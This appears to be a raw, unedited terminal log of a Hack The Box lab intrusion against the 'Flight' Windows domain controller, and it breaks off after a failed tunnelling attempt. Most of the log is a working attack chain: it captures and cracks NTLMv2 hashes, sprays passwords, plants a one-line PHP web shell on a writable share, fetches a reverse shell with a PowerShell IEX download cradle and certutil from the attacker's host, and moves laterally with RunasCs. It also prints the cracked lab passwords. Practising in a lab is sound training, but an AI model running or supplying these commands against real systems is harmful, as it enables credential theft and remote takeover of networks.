@@ -1,0 +1,405 @@
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.187/ -H "Host: FUZZ.flight.htb" -t 50 --hl 154
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.187/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000624:   200        90 L     412 W      3996 Ch     "school"                                                                                         
+
+Total time: 36.97627
+Processed Requests: 19966
+Filtered Requests: 19963
+Requests/sec.: 539.9678
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+this site is vuln to LFI
+
+http://school.flight.htb/index.php?view=//10.10.14.16/htb
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# responder -I tun0 -v                
+...
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:ff12607ca3a419a4:62699C6619C90164AA5C49C244D3EE9A:010100000000000000E96C000B1BDC018A9B42FFAEB46D340000000002000800320032004500460001001E00570049004E002D0042003200530049004600390048004100300043004D0004003400570049004E002D0042003200530049004600390048004100300043004D002E0032003200450046002E004C004F00430041004C000300140032003200450046002E004C004F00430041004C000500140032003200450046002E004C004F00430041004C000700080000E96C000B1BDC0106000400020000000800300030000000000000000000000000300000E14F60BD78320E130DC85DD4211585A6FB91310ADF0226641254874355EA87340A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'svc_apache::flight:ff12607ca3a419a4:62699C6619C90164AA5C49C244D3EE9A:010100000000000000E96C000B1BDC018A9B42FFAEB46D340000000002000800320032004500460001001E00570049004E002D0042003200530049004600390048004100300043004D0004003400570049004E002D0042003200530049004600390048004100300043004D002E0032003200450046002E004C004F00430041004C000300140032003200450046002E004C004F00430041004C000500140032003200450046002E004C004F00430041004C000700080000E96C000B1BDC0106000400020000000800300030000000000000000000000000300000E14F60BD78320E130DC85DD4211585A6FB91310ADF0226641254874355EA87340A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+S@Ss!K@*t13      (svc_apache)     
+1g 0:00:00:05 DONE (2025-09-01 06:39) 0.1748g/s 1864Kp/s 1864Kc/s 1864KC/s SAILE11463..S@29$JL
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+──(root㉿kali)-[/home/kali]
+└─# smbmap -H flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                                       [*] Detected 1 hosts serving SMB
+[|] Initializing hosts...                                                                                            [/] Authenticating...                                                                                                [-] Authenticating...                                                                                                [\] Authenticating...                                                                                                [|] Authenticating...                                                                                                [*] Established 1 SMB connections(s) and 1 authenticated session(s)
+[/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                                                                                                                                
+[+] IP: 10.10.11.187:445	Name: flight.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ ONLY	
+[-] Closing connections..                                                                                            [\] Closing connections..                                                                                            [|] Closing connections..                                                                                            [/] Closing connections..                                                                                            [-] Closing connections..                                                                                            [*] Closed 1 connections                                                                            
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Brute forcing SIDs at flight.htb
+[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
+498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: flight\Administrator (SidTypeUser)
+501: flight\Guest (SidTypeUser)
+502: flight\krbtgt (SidTypeUser)
+512: flight\Domain Admins (SidTypeGroup)
+513: flight\Domain Users (SidTypeGroup)
+514: flight\Domain Guests (SidTypeGroup)
+515: flight\Domain Computers (SidTypeGroup)
+516: flight\Domain Controllers (SidTypeGroup)
+517: flight\Cert Publishers (SidTypeAlias)
+518: flight\Schema Admins (SidTypeGroup)
+519: flight\Enterprise Admins (SidTypeGroup)
+520: flight\Group Policy Creator Owners (SidTypeGroup)
+521: flight\Read-only Domain Controllers (SidTypeGroup)
+522: flight\Cloneable Domain Controllers (SidTypeGroup)
+525: flight\Protected Users (SidTypeGroup)
+526: flight\Key Admins (SidTypeGroup)
+527: flight\Enterprise Key Admins (SidTypeGroup)
+553: flight\RAS and IAS Servers (SidTypeAlias)
+571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
+572: flight\Denied RODC Password Replication Group (SidTypeAlias)
+1000: flight\Access-Denied Assistance Users (SidTypeAlias)
+1001: flight\G0$ (SidTypeUser)
+1102: flight\DnsAdmins (SidTypeAlias)
+1103: flight\DnsUpdateProxy (SidTypeGroup)
+1602: flight\S.Moon (SidTypeUser)
+1603: flight\R.Cold (SidTypeUser)
+1604: flight\G.Lors (SidTypeUser)
+1605: flight\L.Kein (SidTypeUser)
+1606: flight\M.Gold (SidTypeUser)
+1607: flight\C.Bum (SidTypeUser)
+1608: flight\W.Walker (SidTypeUser)
+1609: flight\I.Francis (SidTypeUser)
+1610: flight\D.Truff (SidTypeUser)
+1611: flight\V.Stevens (SidTypeUser)
+1612: flight\svc_apache (SidTypeUser)
+1613: flight\O.Possum (SidTypeUser)
+1614: flight\WebDevs (SidTypeGroup)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb' | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}' > users    
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb flight.htb -u users -p 'S@Ss!K@*t13' 
+SMB         flight.dc0.     445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.dc0.     445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.dc0.     445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.dc0.     445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.dc0.     445    G0               [-] flight.htb\G0$:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.dc0.     445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+
+echo -e "[InternetShortcut]\nURL=\\\\10.10.14.16\\share" > ntlm_theft.ini
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# responder -I tun0 -v
+...
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:c52e6ceac1613af0:FEFB5870F796BAF33BD8E6E77C2298C2:010100000000000080E30150101BDC0153A5DFF7AC8F05C60000000002000800330053003000510001001E00570049004E002D0043005600570053004300340041004E004C005700350004003400570049004E002D0043005600570053004300340041004E004C00570035002E0033005300300051002E004C004F00430041004C000300140033005300300051002E004C004F00430041004C000500140033005300300051002E004C004F00430041004C000700080080E30150101BDC0106000400020000000800300030000000000000000000000000300000E14F60BD78320E130DC85DD4211585A6FB91310ADF0226641254874355EA87340A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'c.bum::flight.htb:c52e6ceac1613af0:FEFB5870F796BAF33BD8E6E77C2298C2:010100000000000080E30150101BDC0153A5DFF7AC8F05C60000000002000800330053003000510001001E00570049004E002D0043005600570053004300340041004E004C005700350004003400570049004E002D0043005600570053004300340041004E004C00570035002E0033005300300051002E004C004F00430041004C000300140033005300300051002E004C004F00430041004C000500140033005300300051002E004C004F00430041004C000700080080E30150101BDC0106000400020000000800300030000000000000000000000000300000E14F60BD78320E130DC85DD4211585A6FB91310ADF0226641254874355EA87340A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000' > hash 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Tikkycoll_431012284 (c.bum)     
+1g 0:00:00:05 DONE (2025-09-01 07:19) 0.1824g/s 1922Kp/s 1922Kc/s 1922KC/s TinchyStryder..Tiffani29
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+──(root㉿kali)-[/home/kali]
+└─# smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                                       [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                                [/] Authenticating...                                                                                                [-] Authenticating...                                                                                                [*] Established 1 SMB connections(s) and 1 authenticated session(s)
+[\] Authenticating...                                                                                                [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                            [/] Enumerating shares...                                                                                            [-] Enumerating shares...                                                                                            [\] Enumerating shares...                                                                                            [|] Enumerating shares...                                                                                                                                                                                                
+[+] IP: 10.10.11.187:445	Name: flight.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ, WRITE	
+[/] Closing connections..                                                                                            [-] Closing connections..                                                                                            [*] Closed 1 connections                                                                            
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat shell.PHP 
+<?php
+$cmd=$_GET['cmd'];
+system($cmd);
+?>
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //flight.htb/Web -U 'c.bum'
+Password for [WORKGROUP\c.bum]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Sep  1 09:47:01 2025
+  ..                                  D        0  Mon Sep  1 09:47:01 2025
+  flight.htb                          D        0  Mon Sep  1 09:47:01 2025
+  school.flight.htb                   D        0  Mon Sep  1 09:47:01 2025
+
+		5056511 blocks of size 4096. 1247816 blocks available
+smb: \> cd flight.htb
+smb: \flight.htb\> put shell.php
+shell.php does not exist
+smb: \flight.htb\> put shell.PHP
+putting file shell.PHP as \flight.htb\shell.PHP (0.5 kb/s) (average 0.5 kb/s)
+smb: \flight.htb\> 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl "http://flight.htb/shell.PHP?cmd=powershell%20-c%20%22IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.16/shell.ps1%27%29%22"
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.187 - - [01/Sep/2025 10:09:59] "GET /shell.ps1 HTTP/1.1" 200 -
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.187] 50558
+whoami
+flight\svc_apache
+PS C:\xampp\htdocs\flight.htb> 
+
+PS C:\xampp\htdocs\flight.htb> powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.16/shell5555.ps1' -OutFile 'C:\users\public\music\shell5555.ps1'"
+PS C:\xampp\htdocs\flight.htb> .\RunasCs.exe c.bum Tikkycoll_431012284 --bypass-uac --logon-type 8 "powershell -ExecutionPolicy Bypass -File C:\users\public\music\shell5555.ps1"
+PS C:\xampp\htdocs\flight.htb> dir
+
+
+    Directory: C:\xampp\htdocs\flight.htb
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         9/1/2025   7:37 AM                css                                                                   
+d-----         9/1/2025   7:37 AM                images                                                                
+d-----         9/1/2025   7:37 AM                js                                                                    
+-a----        2/23/2022   9:58 PM           7069 index.html                                                            
+-a----         9/1/2025   7:08 AM             42 shell.PHP                                                             
+
+
+PS C:\xampp\htdocs\flight.htb> certutil -urlcache -split -f "http://10.10.14.16/RunasCs.exe" RunasCs.exe
+****  Online  ****
+  0000  ...
+  ca00
+CertUtil: -URLCache command completed successfully.
+PS C:\xampp\htdocs\flight.htb> .\RunasCs.exe c.bum Tikkycoll_431012284 --bypass-uac --logon-type 8 "powershell -ExecutionPolicy Bypass -File C:\users\public\music\shell5555.ps1"
+[-] RunasCsException: [!] Failed to set the token's Integrity Level: High
+PS C:\xampp\htdocs\flight.htb> .\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "powershell -ExecutionPolicy Bypass -File C:\users\public\music\shell5555.ps1"
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 5555     
+listening on [any] 5555 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.187] 50650
+whoami
+flight\c.bum
+PS C:\Windows\system32> 
+
+
+PS C:\Users\C.Bum\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                           
+============ ==============================================
+flight\c.bum S-1-5-21-4078382237-1492182817-2568127209-1607
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes                                        
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeMachineAccountPrivilege     Add workstations to domain     Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+PS C:\Users\C.Bum\Desktop> 
+
+
+C.Bum is in the WebDevs group. 
+
+S C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         9/1/2025   7:42 AM                inetpub                                                               
+d-----         6/7/2022   6:39 AM                PerfLogs                                                              
+d-r---       10/21/2022  11:49 AM                Program Files                                                         
+d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   
+d-----         9/1/2025   4:20 AM                Shared                                                                
+d-----        9/22/2022  12:28 PM                StorageReports                                                        
+d-r---        9/22/2022   1:16 PM                Users                                                                 
+d-----       10/21/2022  11:52 AM                Windows                                                               
+d-----        9/22/2022   1:16 PM                xampp                                                                 
+
+
+PS C:\> 
+
+PS C:\> Get-NetTCPConnection -State Listen
+
+LocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting
+------------                        --------- -------------                       ---------- -----       --------------
+::                                  49722     ::                                  0          Listen                    
+::                                  49697     ::                                  0          Listen                    
+::                                  49682     ::                                  0          Listen                    
+::                                  49674     ::                                  0          Listen                    
+::                                  49673     ::                                  0          Listen                    
+::                                  49667     ::                                  0          Listen                    
+::                                  49666     ::                                  0          Listen                    
+::                                  49665     ::                                  0          Listen                    
+::                                  49664     ::                                  0          Listen                    
+::                                  47001     ::                                  0          Listen                    
+::                                  9389      ::                                  0          Listen                    
+::                                  8000      ::                                  0          Listen                    
+...
+
+Port 8000 is not a default port.
+
+
+
+
+chisel tunneling to the website/port is not working.
+will come back.
+
+
+
+
+
+
+
+
+
